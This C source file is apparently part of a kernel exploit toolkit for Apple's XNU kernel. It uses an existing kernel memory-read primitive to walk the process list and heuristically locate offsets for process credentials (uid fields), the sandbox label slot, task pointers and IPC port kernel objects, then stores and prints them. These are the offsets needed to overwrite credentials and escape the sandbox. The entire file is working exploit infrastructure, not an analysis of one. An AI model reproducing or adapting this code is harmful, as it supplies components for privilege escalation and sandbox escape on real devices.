#include <string.h>
#include <ctype.h>
#include <stdio.h>
#include "melatonin.h"
#include "offsets.h"

#define SCAN_PROC 0x600
#define SCAN_TASK 0x600
#define SCAN_RO   0x200
#define SCAN_CRED 0x100
#define SCAN_PORT 0x200
#define NPROC     3

static int r64(kva_t a, uint64_t *v) { return kread(a, v, 8); }
static int r32(kva_t a, uint32_t *v) { return kread(a, v, 4); }

static int comm_ok(kva_t a) {
    char b[16];
    if (kread(a, b, sizeof b) != 0) return 0;
    int n = 0;
    for (int i = 0; i < 16; i++) {
        unsigned char c = (unsigned char)b[i];
        if (isalnum(c) || c == '_' || c == '-') { n++; continue; }
        break;
    }
    return n >= 4;
}

static int build_chain(kva_t head, uint64_t off, kva_t *out) {
    kva_t cur = head;
    for (int i = 0; i < NPROC; i++) {
        out[i] = cur;
        uint64_t nx = 0;
        if (r64(cur + off, &nx) != 0) return 0;
        if (i == NPROC - 1) return 1;
        if (!mela_is_kptr(nx)) return 0;
        cur = mela_canon(nx);
        for (int j = 0; j < i; j++)
            if (out[j] == cur) return 0;
    }
    return 0;
}

/* pids distinct, all sane, kernel proc is 0 */
static int pid_ok(kva_t *p, uint64_t off) {
    uint32_t v[NPROC];
    int zero = 0;

    for (int i = 0; i < NPROC; i++) {
        if (r32(p[i] + off, &v[i]) != 0) return 0;
        if (v[i] > 0x40000) return 0;
        if (!v[i]) zero = 1;
    }
    for (int i = 0; i < NPROC; i++)
        for (int j = i + 1; j < NPROC; j++)
            if (v[i] == v[j]) return 0;
    return zero;
}

/* proc_ro itr: ro -> ucred, small uid, label ptr, same shape on every proc */
static int cred_layout(kva_t *p, uint64_t *o_ro, uint64_t *o_cred,
                       uint64_t *o_uid, uint64_t *o_lab) {
    kva_t ro[NPROC], cr[NPROC];

    for (uint64_t o = 0; o < SCAN_RO; o += 8) {
        int ok = 1;
        for (int i = 0; i < NPROC && ok; i++) {
            uint64_t v;
            ok = r64(p[i] + o, &v) == 0 && mela_is_kptr(v);
            ro[i] = mela_canon(v);
        }
        if (!ok) continue;

        for (uint64_t u = 0; u < 0x80; u += 8) {
            ok = 1;
            for (int i = 0; i < NPROC && ok; i++) {
                uint64_t v;
                ok = r64(ro[i] + u, &v) == 0 && mela_is_kptr(v);
                cr[i] = mela_canon(v);
            }
            if (!ok) continue;

            uint64_t l = 0;
            for (; l < SCAN_CRED; l += 8) {
                int lok = 1;
                for (int i = 0; i < NPROC && lok; i++) {
                    uint64_t v;
                    lok = r64(cr[i] + l, &v) == 0 && mela_is_kptr(v);
                }
                if (lok) break;
            }
            if (l >= SCAN_CRED) continue;

            uint64_t q = 0;
            for (; q < SCAN_CRED; q += 8) {
                uint32_t id[NPROC];
                int qok = 1, distinct = 0;
                for (int i = 0; i < NPROC && qok; i++) {
                    qok = r32(cr[i] + q, &id[i]) == 0 && id[i] <= 501;
                }
                if (!qok || q == l) continue;
                for (int i = 1; i < NPROC; i++)
                    if (id[i] != id[0]) distinct++;
                if (!id[0] && distinct) {
                    *o_ro = o; *o_cred = u; *o_uid = q; *o_lab = l;
                    return 1;
                }
            }
        }
    }
    return 0;
}

/* task -> itk_self -> ipc_port -> ip_kobject == task backref */
static int task_layout(kva_t *p, uint64_t *o_task, uint64_t *o_itk, uint64_t *o_kobj) {
    for (uint64_t t = 0; t < SCAN_PROC; t += 8) {
        uint64_t task;
        if (r64(p[0] + t, &task) != 0 || !mela_is_kptr(task)) continue;
        task = mela_canon(task);

        for (uint64_t i = 0; i < SCAN_TASK; i += 8) {
            uint64_t port;
            if (r64(task + i, &port) != 0 || !mela_is_kptr(port)) continue;
            port = mela_canon(port);

            for (uint64_t k = 0; k < SCAN_PORT; k += 8) {
                uint64_t obj;
                if (r64(port + k, &obj) != 0) continue;
                if (mela_canon(obj) != task) continue;

                *o_task = t; *o_itk = i; *o_kobj = k;
                return 1;
            }
        }
    }
    return 0;
}

static int comm_layout(kva_t *p, uint64_t *o_comm) {
    for (uint64_t c = 0; c < SCAN_PROC; c += 8) {
        int n = 0;
        for (int i = 0; i < NPROC; i++)
            if (comm_ok(p[i] + c)) n++;
        if (n == NPROC) { *o_comm = c; return 1; }
    }
    return 0;
}

/* kernel label slot is 0; a sandboxed label holds a kernel pointer */
static int sandbox_layout(kva_t *p, uint64_t o_ro, uint64_t o_cred,
                          uint64_t o_lab, uint64_t *o_sb) {
    kva_t lab[NPROC];

    for (int i = 0; i < NPROC; i++) {
        uint64_t ro, cr;
        if (r64(p[i] + o_ro, &ro) != 0) return 0;
        if (r64(mela_canon(ro) + o_cred, &cr) != 0) return 0;
        if (r64(mela_canon(cr) + o_lab, &lab[i]) != 0) return 0;
    }

    for (uint64_t s = 0; s < 0x40; s += 8) {
        uint64_t v0;
        if (r64(lab[0] + s, &v0) != 0 || v0 != 0) continue;

        int hits = 0;
        for (int i = 1; i < NPROC; i++) {
            uint64_t v;
            if (r64(lab[i] + s, &v) == 0 && mela_is_kptr(v)) hits++;
        }
        if (hits >= 1) { *o_sb = s; return 1; }
    }
    return 0;
}

int mela_offsets_autoprobe(void) {
    kva_t head = kread64(kaddr(g_off.allproc));
    if (!mela_is_kptr(head)) return -1;
    head = mela_canon(head);

    kva_t procs[NPROC];
    uint64_t o_list = 0, o_pid = 0;
    int found = 0;

    for (uint64_t o = 0; o < SCAN_PROC && !found; o += 8) {
        if (!build_chain(head, o, procs)) continue;
        for (uint64_t q = 0; q < SCAN_PROC; q += 4) {
            if (pid_ok(procs, q)) { o_list = o; o_pid = q; found = 1; break; }
        }
    }
    if (!found) return -2;

    uint64_t o_ro, o_cred, o_uid, o_lab;
    if (!cred_layout(procs, &o_ro, &o_cred, &o_uid, &o_lab)) return -3;

    uint64_t o_task, o_itk, o_kobj;
    if (!task_layout(procs, &o_task, &o_itk, &o_kobj)) return -4;

    uint64_t o_comm;
    if (!comm_layout(procs, &o_comm)) return -5;

    uint64_t o_sb = g_off.label_sandbox;
    sandbox_layout(procs, o_ro, o_cred, o_lab, &o_sb);

    g_off.proc_list       = o_list;
    g_off.proc_pid        = o_pid;
    g_off.proc_ro         = o_ro;
    g_off.proc_ucred      = o_cred;
    g_off.ucred_uid       = o_uid;
    g_off.ucred_ruid      = o_uid + 8;
    g_off.ucred_svuid     = o_uid + 16;
    g_off.ucred_label     = o_lab;
    g_off.proc_task       = o_task;
    g_off.task_itk        = o_itk;
    g_off.ipc_port_kobject = o_kobj;
    g_off.proc_comm       = o_comm;
    g_off.label_sandbox   = o_sb;
    return 0;
}

void mela_offsets_report(const char *how) {
    printf("[offsets] %s\n", how ? how : "table");
    printf("%-22s 0x%llx\n", "kbase", (unsigned long long)g_mela.kbase);
    printf("%-22s 0x%llx\n", "allproc", (unsigned long long)g_off.allproc);
    printf("%-22s 0x%llx\n", "rootvnode", (unsigned long long)g_off.rootvnode);
    printf("%-22s 0x%llx\n", "apfs_mnt", (unsigned long long)g_off.apfs_mnt);
    printf("%-22s 0x%llx\n", "proc_list", (unsigned long long)g_off.proc_list);
    printf("%-22s 0x%llx\n", "proc_pid", (unsigned long long)g_off.proc_pid);
    printf("%-22s 0x%llx\n", "proc_ro", (unsigned long long)g_off.proc_ro);
    printf("%-22s 0x%llx\n", "proc_ucred", (unsigned long long)g_off.proc_ucred);
    printf("%-22s 0x%llx\n", "proc_task", (unsigned long long)g_off.proc_task);
    printf("%-22s 0x%llx\n", "proc_comm", (unsigned long long)g_off.proc_comm);
    printf("%-22s 0x%llx\n", "ucred_uid", (unsigned long long)g_off.ucred_uid);
    printf("%-22s 0x%llx\n", "ucred_label", (unsigned long long)g_off.ucred_label);
    printf("%-22s 0x%llx\n", "label_sandbox", (unsigned long long)g_off.label_sandbox);
    printf("%-22s 0x%llx\n", "task_itk", (unsigned long long)g_off.task_itk);
    printf("%-22s 0x%llx\n", "port_kobject", (unsigned long long)g_off.ipc_port_kobject);
}
